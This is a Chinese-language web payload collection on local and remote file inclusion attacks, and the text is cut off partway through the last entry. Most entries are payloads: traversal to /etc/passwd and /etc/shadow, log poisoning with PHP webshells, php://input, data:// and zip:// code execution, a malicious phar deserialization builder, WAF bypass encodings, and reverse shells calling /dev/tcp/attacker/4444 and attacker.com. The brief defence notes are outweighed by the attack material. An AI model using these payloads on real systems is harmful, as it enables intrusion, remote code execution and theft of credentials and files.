# LFI/RFI文件包含

_12 条 web payload_

### 本地文件包含  `lfi-basic`
_本地文件包含漏洞利用技术_
子类：**本地包含** · tags: `lfi` `local` `file` `inclusion`

**前置条件：**
- 存在文件包含功能
- 用户可控制包含路径

**攻击链：**

**1. 探测LFI**
> 探测本地文件包含
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..\..\..\windows\win.ini
?page=php://filter/convert.base64-encode/resource=index.php
```
**语法解析：**
- `../` — 上级目录遍历 _path_
- `etc/passwd` — Linux用户文件 _value_

**2. 读取敏感文件**
> 读取Linux敏感文件
_platform: linux_
```
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../proc/self/environ
../../../proc/self/cmdline
```
**语法解析：**
- `/proc/self/` — 当前进程信息目录 _path_
- `environ` — 环境变量文件 _value_

**3. PHP伪协议**
> 使用PHP伪协议
```
php://filter/convert.base64-encode/resource=config.php
php://input (POST数据作为输入)
php://data://text/plain,<?php phpinfo();?>
phar://archive.zip/shell.php
```
**语法解析：**
- `php://filter` — PHP Filter伪协议 _value_
- `php://input` — 读取POST数据 _value_
- `data://` — Data伪协议 _value_

**4. 日志投毒**
> 通过日志投毒获取RCE
_platform: linux_
```
1. 包含日志文件: ../../../var/log/apache2/access.log
2. 在User-Agent中注入: <?php system($_GET['c']); ?>
3. 访问: ?file=../../../var/log/apache2/access.log&c=id
```
**语法解析：**
- `access.log` — Apache访问日志 _path_
- `User-Agent` — 用户代理头 _value_

**WAF/EDR 绕过变体：**

**目录遍历绕过**
> 绕过目录遍历过滤
```
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
....\/....\/....\/etc/passwd
```
**语法解析：**
- `%252f` — 双重URL编码的斜杠 _encoding_
- `%c0%af` — UTF-8编码的斜杠 _variable_

**后缀绕过**
> 绕过文件后缀检查
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd/.jpg
php://filter/convert.base64-encode/resource=config.php%00
```
**语法解析：**
- `%00` — 空字节截断 _encoding_


**概述：** 本地文件包含(LFI)漏洞允许攻击者通过操纵文件路径参数读取服务器上的任意文件，包括配置文件、源代码、密码文件等敏感信息，严重时可结合日志投毒等技术实现远程代码执行。

**漏洞原理：** LFI漏洞源于应用程序将用户输入直接拼接到文件操作函数(如PHP的include/require/fopen)中。攻击者使用../目录遍历符号访问Web根目录之外的文件，如/etc/passwd、/etc/shadow、应用配置文件等。

**利用方法：** 完整利用流程：
1. 探测文件包含点
2. 使用目录遍历读取敏感文件
3. 使用伪协议读取源码
4. 通过日志投毒获取RCE

**防御措施：** 防御措施：
1. 使用白名单验证文件名
2. 禁用PHP伪协议
3. 使用basename()处理路径
4. 限制包含目录

---

### 远程文件包含  `rfi-basic`
_远程文件包含漏洞利用技术_
子类：**远程包含** · tags: `rfi` `remote` `file` `inclusion`

**前置条件：**
- 存在文件包含功能
- allow_url_include=On
- 用户可控制包含路径

**攻击链：**

**1. 探测RFI**
> 探测远程文件包含
```
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt%00
?file=http://attacker.com/shell.txt?
```
**语法解析：**
- `http://` — 远程URL协议 _domain_
- `attacker.com` — 攻击者服务器 _domain_
- `%00` — 空字节截断绕过后缀 _encoding_

**2. 托管恶意文件**
> 托管恶意文件并执行
```
# shell.txt内容
<?php system($_GET['cmd']); ?>

# 访问
?file=http://attacker.com/shell.txt&cmd=id
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**3. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
# shell.txt内容
<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
<?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `system()` — 系统命令执行 _function_

**4. 使用data协议**
> 使用data协议执行代码
```
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
**语法解析：**
- `data://` — Data伪协议 _value_
- `text/plain` — MIME类型 _value_
- `base64` — Base64编码 _encoding_

**WAF/EDR 绕过变体：**

**双写绕过**
> 双写绕过关键字过滤
```
?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.com/shell.txt
```
**语法解析：**
- `?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.co` — 攻击载荷 _value_

**大小写混淆**
> 大小写混淆绕过
```
?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt
```
**语法解析：**
- `?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt` — 攻击载荷 _value_

**协议替换**
> 使用其他协议
```
?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```
**语法解析：**
- `?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/res` — 攻击载荷 _value_


**概述：** 远程文件包含(RFI)允许攻击者将远程服务器上的恶意文件包含到目标应用中执行，可直接实现远程代码执行。RFI需要PHP的allow_url_include配置开启(默认关闭)。

**漏洞原理：** RFI漏洞在LFI基础上进一步利用：当PHP的allow_url_include=On时，include()/require()函数可加载远程URL上的PHP文件并在本地执行。攻击者只需在自己的服务器上放置恶意PHP脚本即可实现RCE。

**利用方法：** 完整利用流程：
1. 探测远程文件包含
2. 托管恶意PHP文件
3. 包含并执行代码
4. 获取Shell

**防御措施：** 防御措施：
1. 设置allow_url_include=Off
2. 使用白名单验证文件名
3. 禁用远程文件包含
4. 限制包含目录

---

### 日志投毒LFI  `lfi-log-poison`
_通过日志投毒实现LFI到RCE_
子类：**日志投毒** · tags: `lfi` `log` `poison` `rce`

**前置条件：**
- 存在LFI漏洞
- 可包含日志文件
- 日志文件可写

**攻击链：**

**1. 探测日志文件位置**
> 探测日志文件位置
_platform: linux_
```
# Apache日志
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/httpd/access_log
../../../var/log/nginx/access.log

# 系统日志
../../../var/log/auth.log
../../../var/log/syslog
```
**语法解析：**
- `access.log` — Apache访问日志 _path_
- `error.log` — Apache错误日志 _path_

**2. 投毒User-Agent**
> 在User-Agent中注入代码
```
# 使用curl投毒
curl -A "<?php system($_GET['c']); ?>" http://target.com/

# 或使用Burp Suite修改User-Agent
User-Agent: <?php system($_GET['c']); ?>
```
**语法解析：**
- `-A` — curl设置User-Agent _parameter_
- `<?php` — PHP开始标签 _value_

**3. 投毒请求路径**
> 在请求路径中注入代码
```
# 在URL路径中注入
curl http://target.com/<?php system($_GET['c']); ?>

# URL编码
curl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
```
**语法解析：**
- `system()` — 系统命令执行 _function_
- `curl` — HTTP请求工具 _command_

**4. 执行命令**
> 包含日志文件执行命令
_platform: linux_
```
# 包含日志文件并执行命令
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/apache2/access.log&c=whoami
?file=../../../var/log/apache2/access.log&c=cat /etc/passwd
```
**语法解析：**
- `../` — 目录回溯 _technique_
- `/etc/passwd` — 系统文件 _path_

**5. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
?file=../../../var/log/apache2/access.log&c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
```
**语法解析：**
- `../` — 路径穿越 _path_

**WAF/EDR 绕过变体：**

**编码绕过**
> WAF绕过技术
```
# 使用Base64编码
<?php eval(base64_decode($_GET['c'])); ?>
# 然后传递Base64编码的命令
```
**语法解析：**
- `eval()` — 代码执行 _function_
- `base64_decode` — Base64解码 _function_


**概述：** LFI日志投毒是将恶意代码注入Web服务器日志(access.log/error.log)，然后通过LFI包含该日志文件触发代码执行，是LFI漏洞从文件读取升级到RCE的经典技术。

**漏洞原理：** 日志投毒利用Web服务器会将HTTP请求信息(User-Agent、Referer等)写入日志的特性。攻击者在请求头中注入PHP代码(如<?php system($_GET[cmd]);?>)，代码被写入日志后，通过LFI包含日志文件触发执行。

**利用方法：** 完整利用流程：
1. 找到日志文件位置
2. 在请求中注入PHP代码
3. 包含日志文件
4. 执行系统命令

**防御措施：** 防御措施：
1. 限制日志文件包含
2. 过滤日志中的特殊字符
3. 禁用PHP执行
4. 使用安全日志配置

---

### PHP伪协议利用  `lfi-wrapper`
_利用PHP伪协议进行LFI攻击_
子类：**伪协议** · tags: `lfi` `wrapper` `php` `protocol`

**前置条件：**
- 存在LFI漏洞
- PHP环境
- 伪协议未禁用

**攻击链：**

**1. php://filter**
> 使用php://filter读取源码
```
# 读取源码(Base64)
?file=php://filter/convert.base64-encode/resource=config.php

# 读取源码(Rot13)
?file=php://filter/read=string.rot13/resource=config.php

# 多重过滤器
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php
```
**语法解析：**
- `php://filter` — PHP Filter伪协议 _value_
- `convert.base64-encode` — Base64编码过滤器 _value_
- `resource=` — 指定资源文件 _value_

**2. php://input**
> 使用php://input执行代码
```
# POST执行PHP代码
?file=php://input
POST: <?php system('id'); ?>

# 执行任意代码
POST: <?php phpinfo(); ?>
POST: <?php echo file_get_contents('/etc/passwd'); ?>
```
**语法解析：**
- `php://input` — 读取POST数据流 _value_
- `POST` — POST请求体 _method_

**3. data://协议**
> 使用data://协议执行代码
```
# 直接执行代码
?file=data://text/plain,<?php system('id'); ?>

# Base64编码
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 执行任意命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```
**语法解析：**
- `data://` — Data伪协议 _value_
- `text/plain` — MIME类型 _value_

**4. phar://协议**
> 使用phar://协议
```
# 创建phar文件
<?php
$p = new Phar('shell.phar');
$p->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
?>

# 包含phar
?file=phar://shell.phar/shell.txt&c=id
```
**语法解析：**
- `phar://` — PHP归档协议 _value_
- `shell.phar` — Phar文件 _value_

**5. zip://协议**
> 使用zip://协议
```
# 创建zip文件
zip shell.zip shell.txt
# shell.txt内容: <?php system($_GET['c']); ?>

# 包含zip
?file=zip://shell.zip%23shell.txt&c=id

# 使用jpg+zip
copy shell.jpg+shell.zip shell.jpg
?file=zip://shell.jpg%23shell.txt&c=id
```
**语法解析：**
- `zip://` — ZIP协议 _value_
- `%23` — URL编码的# _encoding_

**WAF/EDR 绕过变体：**

**大小写混淆**
> 大小写混淆绕过
```
?file=Php://filter/convert.base64-encode/resource=config.php
?file=DATA://text/plain,<?php system('id'); ?>
```
**语法解析：**
- `system()` — 执行系统命令 _function_
- `base64` — Base64编码 _encoding_
- `php://filter` — PHP流过滤器 _technique_
- `data://` — 数据流协议 _technique_

**双重URL编码**
> 双重URL编码绕过
```
?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68%70%3a%2f%2finput
```
**语法解析：**
- `?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68` — 攻击载荷 _value_


**概述：** PHP伪协议(Wrapper)是LFI漏洞利用的核心技术，通过php://filter读取源码、php://input执行代码、data://传递payload、zip://包含压缩文件等方式扩展LFI的攻击能力。

**漏洞原理：** PHP伪协议漏洞利用include()等函数支持的多种流协议：php://filter可进行Base64编码读取PHP源码(避免被执行)、php://input从POST数据读取内容、data://直接嵌入数据、expect://执行系统命令(需扩展)。

**利用方法：** 完整利用流程：
1. 探测LFI漏洞
2. 使用php://filter读取源码
3. 使用php://input执行代码
4. 使用data://执行任意代码

**防御措施：** 防御措施：
1. 禁用伪协议(php.ini配置)
2. 使用白名单验证
3. 限制包含目录
4. 升级PHP版本

---

### 目录遍历技术  `lfi-traversal`
_LFI目录遍历绕过技术_
子类：**目录遍历** · tags: `lfi` `traversal` `bypass` `path`

**前置条件：**
- 存在LFI漏洞
- 存在路径过滤

**攻击链：**

**1. 基础遍历**
> 基础目录遍历
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
```
**语法解析：**
- `../` — 目录回溯 _technique_
- `/etc/passwd` — 系统文件 _path_
- `..\\` — Windows路径回溯 _technique_

**2. 绕过删除../**
> 绕过删除../的过滤
```
....//....//....//etc/passwd
....//....//etc/passwd
..././..././..././etc/passwd
```
**语法解析：**
- `....//` — 删除../后变成../ _value_
- `..././` — 删除../后变成../ _value_

**3. URL编码绕过**
> URL编码绕过
```
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```
**语法解析：**
- `%2f` — 斜杠URL编码 _encoding_
- `%252f` — 双重URL编码 _encoding_
- `%2e%2e` — 点号URL编码 _encoding_

**4. Unicode编码绕过**
> Unicode编码绕过
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```
**语法解析：**
- `%c0%af` — UTF-8编码的斜杠 _variable_
- `%c1%9c` — UTF-8编码的反斜杠 _variable_

**5. 绝对路径绕过**
> 使用绝对路径
```
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:/windows/win.ini
C:\windows\system32\config\sam
```
**语法解析：**
- `/etc/passwd` — 敏感文件路径 _path_

**WAF/EDR 绕过变体：**

**混合编码**
> 混合编码绕过
```
..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
**语法解析：**
- `..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd` — 攻击载荷 _value_

**空字节截断**
> 空字节截断绕过后缀
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```
**语法解析：**
- `%00` — 空字节截断 _encoding_

**点号截断(Windows)**
> Windows点号截断
_platform: windows_
```
../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……
```
**语法解析：**
- `../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……` — 攻击载荷 _value_


**概述：** 目录遍历(Path Traversal)是最基础的LFI利用方式，通过../序列突破应用限定的目录范围，访问文件系统上的任意文件。各种编码和路径规范化技巧可绕过简单的过滤措施。

**漏洞原理：** 目录遍历漏洞在应用仅做简单字符串过滤(如替换../)时仍可被绕过：双写(....//→../)、URL编码(%2e%2e%2f)、Unicode编码、混合大小写、操作系统路径差异(Windows反斜杠)等多种绕过技术。

**利用方法：** 完整利用流程：
1. 探测LFI漏洞
2. 尝试基础遍历
3. 使用编码绕过
4. 读取敏感文件

**防御措施：** 防御措施：
1. 使用basename()处理路径
2. 白名单验证文件名
3. 禁用特殊字符
4. 使用realpath()验证

---

### PHP Filter链攻击  `lfi-php-filter`
_利用PHP Filter链进行LFI攻击_
子类：**PHP Filter** · tags: `lfi` `php` `filter` `chain`

**前置条件：**
- 存在LFI漏洞
- PHP环境
- filter伪协议可用

**攻击链：**

**1. 读取源码**
> 使用Filter读取源码
```
# Base64编码读取
?file=php://filter/convert.base64-encode/resource=index.php

# Rot13读取
?file=php://filter/read=string.rot13/resource=index.php

# 字符转换
?file=php://filter/read=string.toupper/resource=index.php
```
**语法解析：**
- `convert.base64-encode` — Base64编码过滤器 _value_
- `string.rot13` — Rot13编码过滤器 _value_

**2. 多重过滤器**
> 使用多重过滤器
```
# 多重编码
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php

# 去除PHP标签
?file=php://filter/read=string.strip_tags/resource=index.php
```
**语法解析：**
- `|` — 过滤器链接符 _operator_
- `string.strip_tags` — 去除HTML/PHP标签 _value_

**3. Filter链RCE**
> 使用高级过滤器
```
# 使用iconv过滤器
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# 使用zlib压缩
?file=php://filter/zlib.deflate/resource=index.php
?file=php://filter/zlib.inflate/resource=data
```
**语法解析：**
- `php://filter` — PHP过滤器 _method_

**4. 读取配置文件**
> 读取常见框架配置
```
# WordPress配置
?file=php://filter/convert.base64-encode/resource=wp-config.php

# Laravel .env
?file=php://filter/convert.base64-encode/resource=../.env

# ThinkPHP配置
?file=php://filter/convert.base64-encode/resource=application/database.php
```
**语法解析：**
- `php://filter` — PHP过滤器 _method_
- `../` — 路径穿越 _path_

**WAF/EDR 绕过变体：**

**大小写混淆**
> 大小写混淆绕过
```
?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr/convert.base64-encode/resource=config.php
```
**语法解析：**
- `?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr` — 攻击载荷 _value_

**编码绕过**
> URL编码绕过
```
?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php
```
**语法解析：**
- `?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config` — 攻击载荷 _value_


**概述：** php://filter是LFI漏洞利用中最实用的伪协议，可对文件内容进行各种转换(Base64编码/解码、ROT13等)后输出，最常见用途是读取PHP源代码(避免被服务器解析执行而看不到源码)。

**漏洞原理：** php://filter通过链式过滤器对数据流进行转换：convert.base64-encode将PHP源码编码为Base64字符串输出(避免执行)、string.rot13进行ROT13变换、convert.iconv进行字符集转换。过滤器链可组合实现更复杂的数据操作。

**利用方法：** 完整利用流程：
1. 探测LFI漏洞
2. 使用Base64编码读取源码
3. 解码获取源码
4. 分析源码找其他漏洞

**防御措施：** 防御措施：
1. 禁用php://filter
2. 白名单验证文件名
3. 使用realpath()验证
4. 限制包含目录

---

### PHP Input执行  `lfi-php-input`
_利用php://input执行PHP代码_
子类：**PHP Input** · tags: `lfi` `php` `input` `rce`

**前置条件：**
- 存在LFI漏洞
- allow_url_include=On
- POST方法可用

**攻击链：**

**1. 基础执行**
> 使用php://input执行代码
```
# GET请求
GET ?file=php://input

# POST数据
POST: <?php system('id'); ?>
POST: <?php echo 'Hello'; ?>
```
**语法解析：**
- `php://input` — 读取POST数据流 _value_
- `<?php` — PHP开始标签 _value_

**2. 命令执行**
> 执行系统命令
```
# 执行系统命令
POST: <?php system($_GET['c']); ?>
# 然后访问: ?file=php://input&c=id

# 使用exec
POST: <?php echo exec('id'); ?>

# 使用shell_exec
POST: <?php echo shell_exec('id'); ?>
```
**语法解析：**
- `system()` — 执行命令并输出 _function_
- `exec()` — 执行命令返回最后一行 _function_
- `shell_exec()` — 执行命令返回全部输出 _function_

**3. 文件操作**
> 文件操作
```
# 读取文件
POST: <?php echo file_get_contents('/etc/passwd'); ?>

# 写入文件
POST: <?php file_put_contents('shell.php', '<?php system($_GET["c"]); ?>'); ?>

# 列出目录
POST: <?php print_r(scandir('.')); ?>
```

**4. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
POST: <?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
POST: <?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `system()` — 系统命令执行 _function_

**WAF/EDR 绕过变体：**

**编码绕过**
> 使用编码绕过
```
# Base64编码
POST: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
# 解码后: system($_GET['c']);

# Rot13编码
POST: <?php eval(str_rot13('flfgrz($_TRG['p']);')); ?>
```
**语法解析：**
- `eval()` — 代码执行 _function_
- `base64_decode` — Base64解码 _function_

**短标签**
> WAF绕过技术
```
POST: <?=system($_GET['c']);?>
POST: <?=`$_GET[c]`?>
```
**语法解析：**
- `system()` — 系统命令执行 _function_


**概述：** php://input伪协议可从HTTP请求的POST body中读取原始数据，当与include()结合时，攻击者可通过POST body传递PHP代码实现远程代码执行(需allow_url_include=On)。

**漏洞原理：** php://input将POST请求体作为数据流提供给文件包含函数。当include("php://input")被执行时，POST body中的PHP代码将被解析执行。此方式不需要在服务器上创建文件，直接在内存中执行恶意代码。

**利用方法：** 完整利用流程：
1. 探测LFI漏洞
2. 使用php://input
3. POST PHP代码
4. 获取Shell

**防御措施：** 防御措施：
1. 设置allow_url_include=Off
2. 禁用php://input
3. 白名单验证
4. 限制POST内容

---

### PHP Data协议攻击  `lfi-php-data`
_利用data://协议执行PHP代码_
子类：**PHP Data** · tags: `lfi` `php` `data` `protocol`

**前置条件：**
- 存在LFI漏洞
- allow_url_include=On
- data协议可用

**攻击链：**

**1. 基础执行**
> 使用data://协议执行代码
```
# 直接执行
?file=data://text/plain,<?php system('id'); ?>

# 执行phpinfo
?file=data://text/plain,<?php phpinfo(); ?>

# 输出文本
?file=data://text/plain,Hello World
```
**语法解析：**
- `data://` — Data伪协议 _value_
- `text/plain` — MIME类型 _value_
- `,` — 数据分隔符 _value_

**2. Base64编码**
> 使用Base64编码
```
# Base64编码执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# 解码后: <?php system('id'); ?>

# 带参数执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```
**语法解析：**
- `base64` — Base64编码标识 _encoding_
- `PD9waHA...` — Base64编码的PHP代码 _value_

**3. 命令执行**
> 执行系统命令
```
# 交互式命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain,<?php system($_GET['c']); ?>&c=whoami
?file=data://text/plain,<?php system($_GET['c']); ?>&c=cat /etc/passwd
```
**语法解析：**
- `system()` — 执行系统命令 _function_
- `data://` — 数据流协议 _technique_

**4. 反弹Shell**
> 获取反弹Shell
_platform: linux_
```
?file=data://text/plain,<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Base64版本
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==
```
**语法解析：**
- `system()` — 执行系统命令 _function_
- `data://` — 数据流协议 _technique_

**WAF/EDR 绕过变体：**

**大小写混淆**
> 大小写混淆绕过
```
?file=DATA://TEXT/PLAIN,<?php system('id'); ?>
?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```
**语法解析：**
- `system()` — 执行系统命令 _function_
- `data://` — 数据流协议 _technique_

**URL编码**
> URL编码绕过
```
?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
```
**语法解析：**
- `?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%7` — 攻击载荷 _value_

**MIME类型变换**
> 变换MIME类型
```
?file=data://text/html,<?php system('id'); ?>
?file=data://application/x-httpd-php,<?php system('id'); ?>
```
**语法解析：**
- `system()` — 执行系统命令 _function_
- `data://` — 数据流协议 _technique_


**概述：** data://伪协议允许在URL中直接嵌入数据内容，当与LFI结合时可将PHP代码作为"文件"被包含执行。支持Base64编码，可绕过部分内容检测(需allow_url_include=On)。

**漏洞原理：** data://协议将内联数据作为流提供给文件包含函数：data://text/plain,<?php phpinfo();?>直接传递明文PHP代码，data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+传递Base64编码后的代码，可绕过简单的关键词过滤。

**利用方法：** 完整利用流程：
1. 探测LFI漏洞
2. 构造data:// payload
3. 执行PHP代码
4. 获取Shell

**防御措施：** 防御措施：
1. 设置allow_url_include=Off
2. 禁用data://协议
3. 白名单验证
4. 过滤特殊字符

---

### PHP Zip协议攻击  `lfi-php-zip`
_利用zip://协议进行LFI攻击_
子类：**PHP Zip** · tags: `lfi` `php` `zip` `archive`

**前置条件：**
- 存在LFI漏洞
- 可上传zip文件
- zip协议可用

**攻击链：**

**1. 创建恶意Zip**
> 创建恶意Zip文件
```
# 创建shell.txt
echo '<?php system($_GET["c"]); ?>' > shell.txt

# 创建zip文件
zip shell.zip shell.txt

# 或使用Python
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell.txt', '<?php system($_GET["c"]); ?>')
```
**语法解析：**
- `zip` — 创建zip压缩包 _value_
- `shell.txt` — 包含PHP代码的文件 _path_

**2. 上传Zip文件**
> 上传Zip文件
```
# 通过文件上传功能上传shell.zip
# 或通过其他方式上传

# 记住上传路径
/uploads/shell.zip
```

**3. 包含Zip文件**
> 包含Zip文件执行代码
```
# 使用zip://协议包含
?file=zip://uploads/shell.zip%23shell.txt&c=id

# %23是#的URL编码
# 格式: zip://路径#文件名
```
**语法解析：**
- `zip://` — ZIP协议 _value_
- `%23` — #的URL编码 _encoding_
- `shell.txt` — Zip内的文件名 _path_

**4. 图片马**
> 使用图片马上传
```
# 创建图片马
copy image.jpg+shell.zip image.jpg

# 或使用
cat image.jpg shell.zip > image.jpg

# 包含
?file=zip://uploads/image.jpg%23shell.txt&c=id
```
**语法解析：**
- `%xx` — URL编码 _encoding_

**WAF/EDR 绕过变体：**

**使用phar://**
> 使用phar://协议
```
?file=phar://uploads/shell.zip/shell.txt&c=id
# phar://也可以访问zip文件
```
**语法解析：**
- `?file=phar://uploads/shell.zip/shell.txt&c=id
#` — 命令/载荷起始 _command_
- ` phar://也可以访问zip文件` — 参数与载荷内容 _value_

**压缩包嵌套**
> 压缩包嵌套绕过
```
# 在zip中嵌套zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# 包含
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 在zip中嵌套zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# 包含
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id` — 参数与载荷内容 _value_


**概述：** zip://伪协议可从ZIP压缩包中读取并包含指定文件，攻击者上传包含恶意PHP代码的ZIP文件(可伪装为图片等)，然后通过LFI的zip://协议包含其中的PHP文件实现代码执行。

**漏洞原理：** zip://协议利用步骤：1)将PHP webshell压缩为ZIP文件 2)可修改扩展名为.jpg/.png绕过上传限制 3)通过LFI使用zip://upload/shell.jpg#shell.php包含其中的PHP文件 4)PHP解析器会解压并执行其中的代码。

**利用方法：** 完整利用流程：
1. 创建恶意Zip文件
2. 上传Zip文件
3. 使用zip://包含
4. 执行代码

**防御措施：** 防御措施：
1. 禁用zip://协议
2. 严格验证上传文件
3. 白名单验证文件名
4. 限制包含目录

---

### Phar反序列化攻击  `lfi-phar`
_利用Phar反序列化进行RCE_
子类：**Phar反序列化** · tags: `lfi` `phar` `deserialization` `rce`

**前置条件：**
- 存在LFI漏洞
- PHP环境
- phar扩展可用

**攻击链：**

**1. 创建Phar文件**
> 创建恶意Phar文件
```
# 创建恶意Phar
<?php
class Exploit {
    function __destruct() {
        system($_GET['c']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```
**语法解析：**
- `Phar` — PHP归档类 _value_
- `setMetadata` — 设置元数据(序列化对象) _value_
- `__destruct` — 析构函数，反序列化时调用 _value_

**2. 触发反序列化**
> 触发Phar反序列化
```
# 通过file_exists触发
?file=phar://exploit.phar&c=id

# 通过file_get_contents触发
?file=phar://exploit.phar/test.txt&c=id

# 通过include触发
?file=phar://exploit.phar&c=id
```
**语法解析：**
- `phar://` — Phar协议 _value_
- `exploit.phar` — Phar文件 _value_

**3. 图片马Phar**
> 使用图片马Phar
```
# 创建图片Phar
copy exploit.phar exploit.gif

# 或添加GIF头
cp exploit.phar exploit.gif

# 触发
?file=phar://uploads/exploit.gif&c=id
```

**4. 常见Gadget链**
> 使用常见Gadget链
```
# Laravel POP链
# Symfony POP链
# WordPress POP链
# ThinkPHP POP链

# 使用phpggc生成
git clone https://github.com/ambionics/phpggc
php phpggc Laravel/RCE1 system id > exploit.phar
```

**WAF/EDR 绕过变体：**

**Base64编码**
> Base64编码绕过
```
# 将Phar内容Base64编码
# 然后解码触发
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 将Phar内容Base64编码
# 然后解码触发` — 参数与载荷内容 _value_

**伪协议组合**
> 伪协议组合
```
?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
# 组合使用
```
**语法解析：**
- `?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
#` — 命令/载荷起始 _command_
- ` 组合使用` — 参数与载荷内容 _value_


**概述：** phar://伪协议可包含PHP Archive文件中的内容，类似zip://但功能更强。特别的是，phar反序列化漏洞可在不调用unserialize()的情况下触发PHP对象的反序列化操作。

**漏洞原理：** phar://不仅可以像zip://一样包含压缩包中的PHP文件，更关键的是phar文件的元数据(metadata)在被任何文件操作函数(file_exists/is_dir等)处理时会被自动反序列化，可触发POP链执行任意代码。

**利用方法：** 完整利用流程：
1. 找到可利用的类(Gadget)
2. 创建恶意Phar文件
3. 上传或构造Phar
4. 触发反序列化

**防御措施：** 防御措施：
1. 禁用phar扩展
2. 过滤phar://协议
3. 白名单验证文件
4. 升级PHP版本

---

### Session文件包含  `lfi-session`
_利用Session文件进行LFI攻击_
子类：**Session包含** · tags: `lfi` `session` `file` `inclusion`

**前置条件：**
- 存在LFI漏洞
- 可控制Session内容
- 知道Session路径

**攻击链：**

**1. 探测Session路径**
> 探测Session存储路径
```
# Linux默认路径
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php7/sess_[PHPSESSID]
